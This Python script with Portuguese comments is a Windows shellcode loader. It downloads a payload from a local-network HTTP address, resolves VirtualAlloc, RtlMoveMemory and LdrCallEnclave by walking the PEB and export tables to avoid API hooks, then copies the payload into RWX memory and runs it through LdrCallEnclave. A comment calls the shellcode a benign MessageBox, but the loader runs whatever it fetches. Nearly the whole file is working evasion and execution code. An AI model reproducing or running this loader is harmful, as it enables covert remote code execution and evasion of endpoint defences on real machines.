import sys
import ctypes
import ctypes.wintypes as wt
import requests
import struct

# =======================================
# Estruturas
# =======================================
class LIST_ENTRY(ctypes.Structure):
    pass
LIST_ENTRY._fields_ = [
    ("Flink", ctypes.POINTER(LIST_ENTRY)),
    ("Blink", ctypes.POINTER(LIST_ENTRY)),
]

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wt.USHORT),
        ("MaximumLength", wt.USHORT),
        ("Buffer", wt.LPWSTR),
    ]

class PEB_LDR_DATA(ctypes.Structure):
    _fields_ = [
        ("Length", wt.ULONG),
        ("Initialized", wt.BOOL),
        ("SsHandle", wt.LPVOID),
        ("InLoadOrderModuleList", LIST_ENTRY),
        ("InMemoryOrderModuleList", LIST_ENTRY),
        ("InInitializationOrderModuleList", LIST_ENTRY),
    ]

class PEB(ctypes.Structure):
    _fields_ = [
        ("Reserved1", ctypes.c_byte * 2),
        ("BeingDebugged", ctypes.c_byte),
        ("Reserved2", ctypes.c_byte),
        ("Reserved3", ctypes.c_void_p * 2),
        ("Ldr", ctypes.POINTER(PEB_LDR_DATA)),
    ]

# =======================================
# Funções de resolução furtiva
# =======================================
def get_peb():
    """Obtém ponteiro para o PEB do processo atual"""
    class PROCESS_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("Reserved1", ctypes.c_void_p),
            ("PebBaseAddress", ctypes.POINTER(PEB)),
            ("Reserved2", ctypes.c_void_p * 2),
            ("UniqueProcessId", ctypes.c_void_p),
            ("Reserved3", ctypes.c_void_p),
        ]

    pbi = PROCESS_BASIC_INFORMATION()
    NtQueryInformationProcess = ctypes.WinDLL("ntdll").NtQueryInformationProcess
    NtQueryInformationProcess.argtypes = [
        wt.HANDLE, ctypes.c_uint, ctypes.c_void_p,
        ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)
    ]
    NtQueryInformationProcess.restype = ctypes.c_ulong

    status = NtQueryInformationProcess(
        ctypes.windll.kernel32.GetCurrentProcess(),
        0,  # ProcessBasicInformation
        ctypes.byref(pbi),
        ctypes.sizeof(pbi),
        None
    )
    if status != 0:
        raise ctypes.WinError()
    return pbi.PebBaseAddress

def find_module_base(peb_ptr, module_name):
    """Percorre InMemoryOrderModuleList de forma segura para encontrar módulo"""
    ldr = peb_ptr.contents.Ldr
    module_list = ldr.contents.InMemoryOrderModuleList
    list_head = ctypes.addressof(module_list)
    flink = module_list.Flink

    max_hops = 100  # segurança contra loop infinito
    hops = 0

    while flink and hops < max_hops:
        # No InMemoryOrderModuleList, o LIST_ENTRY está offset +0x10 do início de LDR_DATA_TABLE_ENTRY
        entry_addr = ctypes.addressof(flink.contents) - 0x10
        dll_base = ctypes.c_void_p.from_address(entry_addr + 0x30).value
        name_len = ctypes.c_ushort.from_address(entry_addr + 0x58).value
        name_ptr = ctypes.c_void_p.from_address(entry_addr + 0x60).value

        if name_ptr and name_len > 0:
            name = ctypes.wstring_at(name_ptr, name_len // 2)
            if name.lower() == module_name.lower():
                return dll_base

        flink = flink.contents.Flink
        hops += 1

    return None

def get_func_addr(module_base, func_name):
    """Resolve endereço de função pela export table"""
    e_lfanew = struct.unpack_from("<I", ctypes.string_at(module_base, 64), 0x3C)[0]
    export_rva = struct.unpack_from("<I", ctypes.string_at(module_base + e_lfanew + 0x88, 4))[0]
    export_dir = module_base + export_rva

    num_names = struct.unpack_from("<I", ctypes.string_at(export_dir + 0x18, 4))[0]
    addr_names = module_base + struct.unpack_from("<I", ctypes.string_at(export_dir + 0x20, 4))[0]
    addr_funcs = module_base + struct.unpack_from("<I", ctypes.string_at(export_dir + 0x1C, 4))[0]
    addr_ordinals = module_base + struct.unpack_from("<I", ctypes.string_at(export_dir + 0x24, 4))[0]

    for i in range(num_names):
        name_rva = struct.unpack_from("<I", ctypes.string_at(addr_names + i * 4, 4))[0]
        name_addr = module_base + name_rva
        name = ctypes.string_at(name_addr).decode()
        if name == func_name:
            ordinal = struct.unpack_from("<H", ctypes.string_at(addr_ordinals + i * 2, 2))[0]
            func_rva = struct.unpack_from("<I", ctypes.string_at(addr_funcs + ordinal * 4, 4))[0]
            return module_base + func_rva
    return None

# =======================================
# Download do shellcode benigno
# =======================================
url = "http://192.168.20.206:8090/loader.bin"  # Shellcode de MessageBox
try:
    shellcode = requests.get(url).content
    size = len(shellcode)
    print(f"[+] Shellcode recebido ({size} bytes)")
except Exception as e:
    print(f"[!] Erro no download: {e}")
    sys.exit(1)

# =======================================
# Resolução das APIs pelo PEB
# =======================================
peb = get_peb()
kernel32_base = find_module_base(peb, "kernel32.dll")
ntdll_base = find_module_base(peb, "ntdll.dll")

if not kernel32_base or not ntdll_base:
    print("[!] Não foi possível localizar kernel32.dll ou ntdll.dll")
    sys.exit(1)

addr_VirtualAlloc = get_func_addr(kernel32_base, "VirtualAlloc")
addr_RtlMoveMemory = get_func_addr(kernel32_base, "RtlMoveMemory")
addr_LdrCallEnclave = get_func_addr(ntdll_base, "LdrCallEnclave")

VirtualAlloc = ctypes.WINFUNCTYPE(wt.LPVOID, wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)(addr_VirtualAlloc)
RtlMoveMemory = ctypes.WINFUNCTYPE(wt.LPVOID, wt.LPVOID, wt.LPVOID, ctypes.c_size_t)(addr_RtlMoveMemory)
LdrCallEnclave = ctypes.WINFUNCTYPE(wt.DWORD, wt.LPVOID, wt.DWORD, wt.LPVOID)(addr_LdrCallEnclave)

# =======================================
# Execução
# =======================================
mem = VirtualAlloc(None, size, 0x3000, 0x40)  # RWX
if not mem:
    raise ctypes.WinError()

RtlMoveMemory(mem, shellcode, size)

param = wt.LPVOID()
print("[*] Executando shellcode via LdrCallEnclave...")
LdrCallEnclave(mem, 0, ctypes.byref(param))
